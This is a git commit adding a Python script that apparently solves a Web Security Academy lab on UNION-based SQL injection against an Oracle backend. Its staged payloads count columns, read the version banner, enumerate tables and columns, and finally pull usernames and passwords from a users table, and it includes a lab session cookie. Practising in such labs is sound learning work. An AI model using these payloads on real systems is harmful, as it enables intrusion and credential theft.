bb8bf531042f227491f85e4d5813b090d0693a1e
francobrevis <franc.brevis@gmail.com>
2022-06-19 20:30:59 -0400

    Update

---
+++ Labs/SQLinjection/sqlinjectionunion8th.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python3
+
+import urllib.parse
+import requests
+
+
+
+link = "https://0aaf00080389bd57c01f8f6b00200004.web-security-academy.net/filter?category=Pets"
+payload={}
+headers = {
+  'Cookie': 'session=14YGLBDFHLleuiv7PvzUizmJvhf2shjj'
+}
+
+#chunk = "' ORDER BY 2--" # number of columns, both are text
+#chunk = "' UNION SELECT 'abc','def' FROM dual--" # number of columns, both are text
+#chunk = "' UNION SELECT NULL,banner FROM v$version--" # database version = oracle
+#chunk = "' UNION SELECT NULL,table_name FROM all_tables--" # show tables in one field
+#chunk = "' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_XDGEEB'--" # show columns of table
+chunk = "' UNION SELECT NULL,USERNAME_MWLATF||'-'||PASSWORD_YVYSOV FROM USERS_XDGEEB--" # show columns of table
+url = link + urllib.parse.quote(chunk)
+
+response = requests.request("GET", url, headers=headers, data=payload)
+
+print(url)
+print(response.status_code)
